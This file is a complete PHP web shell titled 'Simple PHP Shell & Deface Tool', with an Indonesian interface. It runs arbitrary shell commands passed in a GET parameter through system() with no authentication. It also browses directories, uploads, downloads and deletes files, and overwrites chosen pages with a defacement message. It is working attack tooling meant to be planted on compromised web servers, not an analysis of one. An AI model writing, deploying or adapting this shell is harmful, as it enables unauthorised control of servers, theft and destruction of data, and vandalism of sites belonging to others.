<?php
session_start();

function h($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

$message = '';
$msgColor = '';

// Handle change directory via ?cd=...
if (isset($_GET['cd'])) {
    $raw = rawurldecode($_GET['cd']);

    // If absolute path (unix / or windows drive like C:\), use it directly; otherwise resolve relative to current cwd
    if (PHP_OS_FAMILY === 'Windows') {
        // Windows absolute: starts with letter + : or \\ (UNC)
        if (preg_match('#^[A-Za-z]:[\\/]|^\\\\\\\\#', $raw)) {
            $candidate = realpath($raw);
        } else {
            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
        }
    } else {
        // Unix absolute: starts with /
        if (strpos($raw, '/') === 0) {
            $candidate = realpath($raw);
        } else {
            $candidate = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $raw);
        }
    }

    if ($candidate && is_dir($candidate)) {
        $_SESSION['cwd'] = $candidate;
        $message = "Berpindah ke: " . h($_SESSION['cwd']);
        $msgColor = "green";
    } else {
        $message = "Direktori tidak ditemukan: " . h($raw);
        $msgColor = "red";
    }
}

// Exec command (kept as GET cmd)
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    chdir($_SESSION['cwd']);
    ob_start();
    system($cmd);
    $output = ob_get_clean();
}

// Upload file
if (isset($_FILES['upload_file'])) {
    $uploadDir = $_SESSION['cwd'] . DIRECTORY_SEPARATOR;
    $uploadFile = $uploadDir . basename($_FILES['upload_file']['name']);
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $uploadFile)) {
        $message = "File berhasil diupload: " . h(basename($uploadFile));
        $msgColor = "green";
    } else {
        $message = "Upload gagal!";
        $msgColor = "red";
    }
}

// Deface file
if (isset($_POST['deface_file'])) {
    $targetFile = $_POST['deface_file'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $targetFile);
    $defaceContent = "<html><body style='background:#111;color:#f33;font-family:sans-serif;'><h1 style='text-align:center;margin-top:20vh;font-size:4rem;'>Maintenance</h1></body></html>";

    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        $result = file_put_contents($fullPath, $defaceContent);
        if ($result === false) {
            $message = "Gagal melakukan deface pada file: " . h($targetFile);
            $msgColor = "red";
        } else {
            $message = "Berhasil melakukan deface pada file: " . h($targetFile);
            $msgColor = "green";
        }
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($targetFile);
        $msgColor = "red";
    }
}

// Delete file
if (isset($_GET['delete'])) {
    $fileToDelete = $_GET['delete'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $fileToDelete);
    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        if (unlink($fullPath)) {
            $message = "File berhasil dihapus: " . h($fileToDelete);
            $msgColor = "green";
        } else {
            $message = "Gagal menghapus file: " . h($fileToDelete);
            $msgColor = "red";
        }
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($fileToDelete);
        $msgColor = "red";
    }
}

// Download file
if (isset($_GET['download'])) {
    $fileToDownload = $_GET['download'];
    $fullPath = realpath($_SESSION['cwd'] . DIRECTORY_SEPARATOR . $fileToDownload);
    if ($fullPath && strpos($fullPath, $_SESSION['cwd']) === 0 && is_file($fullPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($fullPath) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($fullPath));
        readfile($fullPath);
        exit;
    } else {
        $message = "File tidak ditemukan atau bukan file: " . h($fileToDownload);
        $msgColor = "red";
    }
}
?>
<!DOCTYPE html>
<html lang="id" class="bg-gray-900 text-gray-100">
<head>
    <meta charset="UTF-8" />
    <title>Simple PHP Shell & Deface Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen p-6 font-sans bg-gray-900 text-gray-100">

<div class="max-w-6xl mx-auto">

    <h1 class="text-4xl font-bold mb-6 text-center">Simple PHP Shell & Deface Tool</h1>

    <?php if ($message): ?>
        <div class="mb-6 px-5 py-3 rounded <?php echo $msgColor === 'green' ? 'bg-green-700' : 'bg-red-700'; ?> text-center font-semibold">
            <?php echo h($message); ?>
        </div>
    <?php endif; ?>

    <!-- Breadcrumb navigation -->
    <div class="mb-8 p-4 bg-gray-800 rounded shadow">
        <h2 class="text-xl font-semibold mb-3">Direktori Saat Ini:</h2>
        <nav class="text-blue-400 flex flex-wrap gap-1 font-mono select-none" aria-label="Breadcrumb">
            <?php
            $parts = explode(DIRECTORY_SEPARATOR, $_SESSION['cwd']);
            $accum = '';

            if (PHP_OS_FAMILY === 'Windows' && preg_match('/^[A-Z]:$/i', $parts[0])) {
                $accum = array_shift($parts);
                echo "<a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($accum) . "</a>";
            } else {
                if (empty($parts[0])) {
                    echo "<a href='?cd=" . rawurlencode('/') . "' class='hover:underline'>/</a>";
                    array_shift($parts);
                    $accum = '/';
                }
            }

            foreach ($parts as $index => $part) {
                if ($part === '') continue;
                $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
                echo "<span>/</span><a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($part) . "</a>";
            }
            ?>
        </nav>
    </div>

    <!-- Folder & File list -->
    <div class="mb-8 bg-gray-800 rounded shadow p-4 overflow-auto max-h-96">
        <h2 class="text-xl font-semibold mb-4">Isi Folder:</h2>
        <ul class="list-disc list-inside space-y-1">
            <?php
            $items = scandir($_SESSION['cwd']);
            foreach ($items as $file) {
                if ($file === '.' || $file === '..') continue;
                $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file;
                $real = realpath($fullPath);
                if ($real === false) continue; // skip broken symlinks etc.
                if (is_dir($real)) {
                    // link to the directory's realpath (encoded)
                    echo "<li><a href='?cd=" . rawurlencode($real) . "' class='text-blue-400 font-medium hover:underline cursor-pointer'>[DIR] " . h($file) . "</a></li>";
                } else {
                    echo "<li class='flex justify-between items-center gap-3'>
                            <span>[FILE] " . h($file) . "</span>
                            <div class='flex gap-2'>
                                <form method='post' class='inline' onsubmit='return confirm(\"Deface file " . h($file) . "?\")'>
                                    <input type='hidden' name='deface_file' value='" . h($file) . "' />
                                    <button type='submit' class='bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-white text-sm'>Deface</button>
                                </form>
                                <a href='?download=" . urlencode($file) . "' class='bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded text-white text-sm'>Download</a>
                                <a href='?delete=" . urlencode($file) . "' class='bg-yellow-500 hover:bg-yellow-600 px-3 py-1 rounded text-white text-sm' onclick='return confirm(\"Hapus file " . h($file) . "?\")'>Delete</a>
                            </div>
                        </li>";
                }
            }
            ?>
        </ul>
    </div>

    <!-- Form upload -->
    <div class="mb-8 bg-gray-800 rounded shadow p-4">
        <h2 class="text-xl font-semibold mb-4">Upload File:</h2>
        <form method="post" enctype="multipart/form-data" class="flex gap-4 items-center">
            <input type="file" name="upload_file" class="bg-gray-700 text-white p-2 rounded">
            <button type="submit" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-white">Upload</button>
        </form>
    </div>

    <!-- Form shell -->
    <div class="bg-gray-800 rounded shadow p-4">
        <h2 class="text-xl font-semibold mb-4">Eksekusi Perintah Shell:</h2>
        <form method="get" class="flex gap-4 items-center">
            <input type="text" name="cmd" class="flex-1 bg-gray-700 text-white p-2 rounded" placeholder="Masukkan perintah shell">
            <button type="submit" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-white">Jalankan</button>
        </form>
        <?php if (isset($output)): ?>
        <pre class="mt-4 p-4 bg-black text-green-400 rounded overflow-auto max-h-60"><?php echo h($output); ?></pre>
        <?php endif; ?>
    </div>

</div>
</body>
</html>
